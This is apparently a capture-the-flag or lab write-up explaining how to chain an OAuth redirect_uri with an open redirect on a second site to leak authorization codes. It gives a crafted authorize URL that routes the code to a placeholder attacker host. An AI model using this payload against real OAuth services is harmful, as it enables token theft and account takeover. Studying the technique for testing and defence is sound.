This attack happens when we can chain a redirect_uri together with a openredirect attack by successfully bypassing any black/whitelist filtering and perform a MITM via OAuth SSO authentication.

# Case Scenario
Same here you have 2 sites, the first where you can register/login with your user and upload some files.
The second you can delete files from the first one by using OAuth tokens for archiving SSO.
But the second site have a open redirect in the HTML source code that you know can perform a MITM in your favor.

### Attack time
1)Identify the "open_redirect" URL that can be used for your needs example can be found in the second website as
```
a href="/?redirect=http://securedocs.htb.net/files/me/65c5e47901a6b90011cd208c/raw"> 
```
2)Now use this URL into browser to form your attack by chaining the redirect_uri + open_redirect so we can bypass effectively the white/blacklisting and perform a MITM
Before(Legit):
```
http://securedocs.htb.net/oauth/authorize?response_type=code&client_id=deletedocs&redirect_uri=http%3A%2F%2Fdeletedocs.htb.net%2Fcallback&scope=view_documents%20delete_document 
```
After(Malicious):
```
http://securedocs.htb.net/oauth/authorize?response_type=code&client_id=deletedocs&redirect_uri=http%3A%2F%2Fdeletedocs.htb.net%2F?redirect=http://<SERVER_IP>:<PORT>&scope=view_documents%20delete_document 
```
